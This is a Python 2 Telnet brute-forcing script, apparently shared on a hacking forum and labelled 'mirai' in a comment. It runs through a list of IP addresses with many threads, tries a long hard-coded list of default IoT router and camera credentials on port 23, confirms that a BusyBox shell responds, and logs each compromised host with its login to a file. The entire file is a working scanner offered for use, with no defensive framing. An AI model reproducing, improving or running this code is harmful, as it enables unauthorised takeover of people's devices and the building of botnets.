# source from only4skillers.eu
# edited by WP
import threading
import sys, os, re, time, socket
from Queue import *
from sys import stdout
 
if len(sys.argv) < 4:
    print "Usage: python "+sys.argv[0]+" <list> <threads> <output file>"
    sys.exit()
 
ips = open(sys.argv[1], "r").readlines()
threads = int(sys.argv[2])
output_file = sys.argv[3]
queue = Queue()
queue_count = 0
 
combo = [ #use as many passwords as ya want(P.S. The more passwords the slower the bruteforce is going to be)
    "root:xc3511",
    "root:vizxv",
    "root:admin",
    "admin:admin",
    "root:888888",
    "root:xmhdipc",
    "root:default",
    "root:juantech",
    "root:123456",
    "root:54321",
    "support:support",
    "root: ",
    "admin:password",
    "root:root",
    "root:12345",
    "user:user",
    "admin:",
    "root:pass",
    "admin:admin1234",
    "root:1111",
    "admin:smcadmin",
    "admin:1111",
    "root:666666",
    "root:password",
    "root:1234",
    "root:klv123",
    "Administrator:admin",
    "service:service",
    "supervisor:supervisor",
    "guest:guest",
    "guest:12345",
    "guest:12345",
    "admin1:password",
    "administrator:1234",
    "666666:666666",
    "888888:888888",
    "ubnt:ubnt",
    "root:klv1234",
    "root:Zte521",
    "root:hi3518",
    "root:jvbzd",
    "root:anko",
    "root:zlxx.",
    "root:7ujMko0vizxv",
    "root:7ujMko0admin",
    "root:system",
    "root:ikwb",
    "root:dreambox",
    "root:user",
    "root:realtek",
    "root:00000000",
    "admin:1111111",
    "admin:1234",
    "admin:12345",
    "admin:54321",
    "admin:123456",
    "admin:7ujMko0admin",
    "admin:1234",
    "admin:pass",
    "admin:meinsm",
    "tech:tech"
]
 
for ip in ips:
    queue_count += 1
    stdout.write("\r[%d] Added to queue" % queue_count)
    stdout.flush()
    queue.put(ip)
print "\n"
 
class router(threading.Thread):
    def __init__ (self, ip):
        threading.Thread.__init__(self)
        self.ip = str(ip).rstrip('\n')
    def run(self):
        username = ""
        password = ""
        for passwd in combo:
            if ":n/a" in passwd:
                password=""
            else:
                password=passwd.split(":")[1]
            if "n/a:" in passwd:
                username=""
            else:
                username=passwd.split(":")[0]
            try:
                tn = socket.socket()
                tn.settimeout(8)
                tn.connect((self.ip,23))
            except Exception:
                tn.close()
                break
            try:
                hoho = ''
                hoho += readUntil(tn, "ogin:")
                if "ogin" in hoho:
                    tn.send(username + "\n")
                    time.sleep(2)
            except Exception:
                tn.close()
            try:
                hoho = ''
                hoho += readUntil(tn, "assword:")
                if "assword" in hoho:
                    tn.send(password + "\n")
                    time.sleep(2)
                else:
                    pass
            except Exception:
                tn.close()
            try:
                prompt = ''
                prompt += tn.recv(40960)
                if ">" in prompt and "ONT" not in prompt:
                    try:
                        tn.send("cat | sh" + "\n")
                        time.sleep(1)
                        success = False
                        timeout = 8
                        data = ["BusyBox", "Built-in"]
                        tn.send("sh" + "\n")
                        time.sleep(1)
                        tn.send("busybox" + "\r\n")
                        buf = '' # NO FALSE POSSITIVES OVA HERE
                        start_time = time.time()
                        while time.time() - start_time < timeout:
                            buf += tn.recv(40960)
                            time.sleep(1)
                            for info in data:
                                if info in buf and "unrecognized" not in buf:
                                    success = True
                                    break
                    except:
                        pass
                elif "#" in prompt or "$" in prompt or "%" in prompt or "@" in prompt:
                    try:
                        success = False
                        timeout = 8
                        data = ["BusyBox", "Built-in"]
                        tn.send("sh" + "\n")
                        time.sleep(0.01)
                        tn.send("shell" + "\n")
                        time.sleep(0.01)
                        tn.send("help" + "\n")
                        time.sleep(0.01)
                        tn.send("busybox" + "\r\n")
                        buf = '' # NO FALSE POSSITIVES OVA HERE
                        start_time = time.time()
                        while time.time() - start_time < timeout:
                            buf += tn.recv(40960)
                            time.sleep(0.01)
                            for info in data:
                                if info in buf and "unrecognized" not in buf:
                                    success = True
                                    break
                    except:
                        pass
                else:
                    tn.close()
                if success == True:
                    try:
                        os.system("echo "+self.ip+":23 "+username+":"+password+" >> "+output_file+"") # 1.1.1.1:23 user:pass # mirai
                        print "\033[32m[\033[31m+\033[32m] \033[33mGOT \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m"%(username, password, self.ip)
                        tn.close()
                        break
                    except:
                        tn.close()
                tn.close()
            except Exception:
                tn.close()
 
def readUntil(tn, string, timeout=8):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.01)
        if string in buf: return buf
    raise Exception('TIMEOUT!')
 
def worker():
    try:
        while True:
            try:
                IP = queue.get()
                thread = router(IP)
                thread.start()
                queue.task_done()
                time.sleep(0.2)
            except:
                pass
    except:
        pass
 
for l in xrange(threads):
    try:
        t = threading.Thread(target=worker)
        t.start()
        time.sleep(0.01)
    except:
        pass